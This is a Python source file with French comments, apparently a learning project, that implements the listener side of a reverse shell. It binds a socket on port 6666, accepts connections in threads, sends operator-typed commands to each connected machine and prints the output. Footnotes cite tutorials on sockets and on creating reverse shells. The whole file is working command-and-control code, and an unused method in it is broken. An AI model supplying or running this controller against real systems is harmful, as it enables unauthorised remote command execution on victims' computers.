#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform
import json

class Server():
    def __init__(self):
        pass

    @staticmethod
    def clrscr():
            if platform.system() == "Linux":
                os.system("clear")
            elif platform.system() == "Windows":
                os.system("cls")

    def encode(self, data):
        # return json.dumps(data).encode("UTF-8")
        return bytes(json.dumps(data), "UTF-8")
         
    
    def decode(self, c):
        data = ""
        while True:
            try:
                data += c.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue

    def incomingData(self, c):
        data = {}
        while True:
            if data["message"] == "exit":
                c.close()
                break
            else:
                # TODO: Change print for DAO 
                data = self.decode(c)
                print(data["message"])

    def incomingReverseShell(self, c):

        quitting = False
        # Reçoit le premier message et initialise data["cwd"]
        data = self.decode(c)
        while not quitting:

            data["command"] = input(f"{data['cwd']} $> ")
            if not data["command"].strip():
                continue
            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                self.clrscr()
                continue
            else:
                c.send(self.encode(data))
                data = self.decode(c)
            
            if data["command"].lower() == "exit":
                quitting = True
                c.close()
                continue
        
            print(data["output"])


    def main(self):
        # [1]_ [2]_  

    # Starting data
        # c = None
        # addr = None
        # message = 'Waiting for connection'
        # s = socket.socket()
        # host = "0.0.0.0"
        # port = 9999
        # s.bind((host, port))
        # s.listen(5)

        # while True:
        #     c, addr = s.accept()
        #     print('Got connection from', addr)
        #     # On crée un thread receiving data
        #     connection_handler = threading.Thread(
        #         target=incomingData,
        #         args=(c, message,)
        #     )
        #     connection_handler.start()
        #     print("\n Nombre de Thread", threading.active_count())
    
    # Starting Reverse Shell
        c = None
        addr = None

        s = socket.socket()

        host = "0.0.0.0"
        port = 6666

        s.bind((host, port))
        s.listen(5)

        while True:
            try:
                c, addr = s.accept()
                print('Got connection from', addr)

                # On crée un thread receiving data
                connection_handler = threading.Thread(
                    target=self.incomingReverseShell,
                    args=(c,)
                )
                connection_handler.start()
                print("\n Nombre de Thread", threading.active_count())
            except socket.timeout:
                continue


if __name__ == "__main__":
   Server().main()


'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell

'''